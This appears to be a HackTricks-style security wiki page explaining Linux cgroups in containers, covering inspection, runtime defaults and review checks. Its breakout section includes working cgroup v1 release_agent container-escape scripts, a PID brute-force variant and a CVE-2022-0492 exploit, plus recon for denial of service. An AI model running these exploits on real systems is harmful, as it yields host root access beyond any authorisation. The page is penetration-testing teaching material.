# cgroups

{{#include ../../../../banners/hacktricks-training.md}}

## Overview

Linux **control groups** are the kernel mechanism used to group processes together for accounting, limiting, prioritization, and policy enforcement. If namespaces are mainly about isolating the view of resources, cgroups are mainly about governing **how much** of those resources a set of processes may consume and, in some cases, **which classes of resources** they may interact with at all. Containers rely on cgroups constantly, even when the user never looks at them directly, because almost every modern runtime needs a way to tell the kernel "these processes belong to this workload, and these are the resource rules that apply to them".

This is why container engines place a new container into its own cgroup subtree. Once the process tree is there, the runtime can cap memory, limit the number of PIDs, weight CPU usage, regulate I/O, and restrict device access. In a production environment, this is essential both for multi-tenant safety and for simple operational hygiene. A container without meaningful resource controls may be able to exhaust memory, flood the system with processes, or monopolize CPU and I/O in ways that make the host or neighboring workloads unstable.

From a security perspective, cgroups matter in two separate ways. First, bad or missing resource limits enable straightforward denial-of-service attacks. Second, some cgroup features, especially in older **cgroup v1** setups, have historically created powerful breakout primitives when they were writable from inside a container.

## v1 Vs v2

There are two major cgroup models in the wild. **cgroup v1** exposes multiple controller hierarchies, and older exploit writeups often revolve around the weird and sometimes overly powerful semantics available there. **cgroup v2** introduces a more unified hierarchy and generally cleaner behavior. Modern distributions increasingly prefer cgroup v2, but mixed or legacy environments still exist, which means both models are still relevant when reviewing real systems.

The difference matters because some of the most famous container breakout stories, such as abuses of **`release_agent`** in cgroup v1, are tied very specifically to older cgroup behavior. A reader who sees a cgroup exploit on a blog and then blindly applies it to a modern cgroup v2-only system is likely to misunderstand what is actually possible on the target.

## Inspection

The quickest way to see where your current shell sits is:

```bash
cat /proc/self/cgroup
findmnt -T /sys/fs/cgroup
```

The `/proc/self/cgroup` file shows the cgroup paths associated with the current process. On a modern cgroup v2 host, you will often see a unified entry. On older or hybrid hosts, you may see multiple v1 controller paths. Once you know the path, you can inspect the corresponding files under `/sys/fs/cgroup` to see limits and current usage.

On a cgroup v2 host, the following commands are useful:

```bash
ls -l /sys/fs/cgroup
cat /sys/fs/cgroup/cgroup.controllers
cat /sys/fs/cgroup/cgroup.subtree_control
```

These files reveal which controllers exist and which ones are delegated to child cgroups. This delegation model matters in rootless and systemd-managed environments, where the runtime may only be able to control the subset of cgroup functionality that the parent hierarchy actually delegates.

## Lab

One way to observe cgroups in practice is to run a memory-limited container:

```bash
docker run --rm -it --memory=256m debian:stable-slim bash
cat /proc/self/cgroup
cat /sys/fs/cgroup/memory.max 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null
```

You can also try a PID-limited container:

```bash
docker run --rm -it --pids-limit=64 debian:stable-slim bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
```

These examples are useful because they help connect the runtime flag to the kernel file interface. The runtime is not enforcing the rule by magic; it is writing the relevant cgroup settings and then letting the kernel enforce them against the process tree.

## Runtime Usage

Docker, Podman, containerd, and CRI-O all rely on cgroups as part of normal operation. The differences are usually not about whether they use cgroups, but about **which defaults they choose**, **how they interact with systemd**, **how rootless delegation works**, and **how much of the configuration is controlled at the engine level versus the orchestration level**.

In Kubernetes, resource requests and limits eventually become cgroup configuration on the node. The path from Pod YAML to kernel enforcement passes through the kubelet, the CRI runtime, and the OCI runtime, but cgroups are still the kernel mechanism that finally applies the rule. In Incus/LXC environments, cgroups are also heavily used, especially because system containers often expose a richer process tree and more VM-like operational expectations.

## Misconfigurations And Breakouts

The classic cgroup security story is the writable **cgroup v1 `release_agent`** mechanism. In that model, if an attacker could write to the right cgroup files, enable `notify_on_release`, and control the path stored in `release_agent`, the kernel could end up executing an attacker-chosen path in the initial namespaces on the host when the cgroup became empty. That is why older writeups place so much attention on cgroup controller writability, mount options, and namespace/capability conditions.

Even when `release_agent` is not available, cgroup mistakes still matter. Overly broad device access can make host devices reachable from the container. Missing memory and PID limits can turn a simple code execution into a host DoS. Weak cgroup delegation in rootless scenarios can also mislead defenders into assuming a restriction exists when the runtime was never actually able to apply it.

### `release_agent` Background

The `release_agent` technique only applies to **cgroup v1**. The basic idea is that when the last process in a cgroup exits and `notify_on_release=1` is set, the kernel executes the program whose path is stored in `release_agent`. That execution happens in the **initial namespaces on the host**, which is what turns a writable `release_agent` into a container escape primitive.

For the technique to work, the attacker generally needs:

- a writable **cgroup v1** hierarchy
- the ability to create or use a child cgroup
- the ability to set `notify_on_release`
- the ability to write a path into `release_agent`
- a path that resolves to an executable from the host point of view

### Classic PoC

The historical one-liner PoC is:

```bash
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p "$d/w"
echo 1 > "$d/w/notify_on_release"
t=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
touch /o
echo "$t/c" > "$d/release_agent"
cat <<'EOF' > /c
#!/bin/sh
ps aux > "$t/o"
EOF
chmod +x /c
sh -c "echo 0 > $d/w/cgroup.procs"
sleep 1
cat /o
```

This PoC writes a payload path into `release_agent`, triggers cgroup release, and then reads back the output file generated on the host.

### Readable Walk-Through

The same idea is easier to understand when broken into steps.

1. Create and prepare a writable cgroup:

```bash
mkdir /tmp/cgrp
mount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if available in v1
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
```

2. Identify the host path that corresponds to the container filesystem:

```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

3. Drop a payload that will be visible from the host path:

```bash
cat <<'EOF' > /cmd
#!/bin/sh
ps aux > /output
EOF
chmod +x /cmd
```

4. Trigger execution by making the cgroup empty:

```bash
sh -c "echo $$ > /tmp/cgrp/x/cgroup.procs"
sleep 1
cat /output
```

The effect is host-side execution of the payload with host root privileges. In a real exploit, the payload usually writes a proof file, spawns a reverse shell, or modifies host state.

### Relative Path Variant Using `/proc/<pid>/root`

In some environments, the host path to the container filesystem is not obvious or is hidden by the storage driver. In that case the payload path can be expressed through `/proc/<pid>/root/...`, where `<pid>` is a host PID belonging to a process in the current container. That is the basis of the relative-path brute-force variant:

```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

sleep 10000 &

cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh
OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
ps -eaf > \${OUTPATH} 2>&1
__EOF__

chmod a+x ${PAYLOAD_PATH}

mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
  if [ $((${TPID} % 100)) -eq 0 ]
  then
    echo "Checking pid ${TPID}"
    if [ ${TPID} -gt ${MAX_PID} ]
    then
      echo "Exiting at ${MAX_PID}"
      exit 1
    fi
  fi
  echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
  sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
  TPID=$((${TPID} + 1))
done

sleep 1
cat ${OUTPUT_PATH}
```

The relevant trick here is not the brute force itself but the path form: `/proc/<pid>/root/...` lets the kernel resolve a file inside the container filesystem from the host namespace, even when the direct host storage path is not known ahead of time.

### CVE-2022-0492 Variant

In 2022, CVE-2022-0492 showed that writing to `release_agent` in cgroup v1 was not correctly checking for `CAP_SYS_ADMIN` in the **initial** user namespace. This made the technique far more reachable on vulnerable kernels because a container process that could mount a cgroup hierarchy could write `release_agent` without already being privileged in the host user namespace.

Minimal exploit:

```bash
apk add --no-cache util-linux
unshare -UrCm sh -c '
  mkdir /tmp/c
  mount -t cgroup -o memory none /tmp/c
  echo 1 > /tmp/c/notify_on_release
  echo /proc/self/exe > /tmp/c/release_agent
  (sleep 1; echo 0 > /tmp/c/cgroup.procs) &
  while true; do sleep 1; done
'
```

On a vulnerable kernel, the host executes `/proc/self/exe` with host root privileges.

For practical abuse, start by checking whether the environment still exposes writable cgroup-v1 paths or dangerous device access:

```bash
mount | grep cgroup
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null -exec ls -l {} \;
find /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50
ls -l /dev | head -n 50
```

If `release_agent` is present and writable, you are already in legacy-breakout territory:

```bash
find /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null
find /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null | head
```

If the cgroup path itself does not yield an escape, the next practical use is often denial of service or reconnaissance:

```bash
cat /sys/fs/cgroup/pids.max 2>/dev/null
cat /sys/fs/cgroup/memory.max 2>/dev/null
cat /sys/fs/cgroup/cpu.max 2>/dev/null
```

These commands quickly tell you whether the workload has room to fork-bomb, consume memory aggressively, or abuse a writable legacy cgroup interface.

## Checks

When reviewing a target, the purpose of the cgroup checks is to learn which cgroup model is in use, whether the container sees writable controller paths, and whether old breakout primitives such as `release_agent` are even relevant.

```bash
cat /proc/self/cgroup                                      # Current process cgroup placement
mount | grep cgroup                                        # cgroup v1/v2 mounts and mount options
find /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive
cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout
```

What is interesting here:

- If `mount | grep cgroup` shows **cgroup v1**, older breakout writeups become more relevant.
- If `release_agent` exists and is reachable, that is immediately worth deeper investigation.
- If the visible cgroup hierarchy is writable and the container also has strong capabilities, the environment deserves much closer review.

If you discover **cgroup v1**, writable controller mounts, and a container that also has strong capabilities or weak seccomp/AppArmor protection, that combination deserves careful attention. cgroups are often treated as a boring resource-management topic, but historically they have been part of some of the most instructive container escape chains precisely because the boundary between "resource control" and "host influence" was not always as clean as people assumed.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Enabled by default | Containers are placed in cgroups automatically; resource limits are optional unless set with flags | omitting `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |
| Podman | Enabled by default | `--cgroups=enabled` is the default; cgroup namespace defaults vary by cgroup version (`private` on cgroup v2, `host` on some cgroup v1 setups) | `--cgroups=disabled`, `--cgroupns=host`, relaxed device access, `--privileged` |
| Kubernetes | Enabled through the runtime by default | Pods and containers are placed in cgroups by the node runtime; fine-grained resource control depends on `resources.requests` / `resources.limits` | omitting resource requests/limits, privileged device access, host-level runtime misconfiguration |
| containerd / CRI-O | Enabled by default | cgroups are part of normal lifecycle management | direct runtime configs that relax device controls or expose legacy writable cgroup v1 interfaces |

The important distinction is that **cgroup existence** is usually default, while **useful resource constraints** are often optional unless explicitly configured.
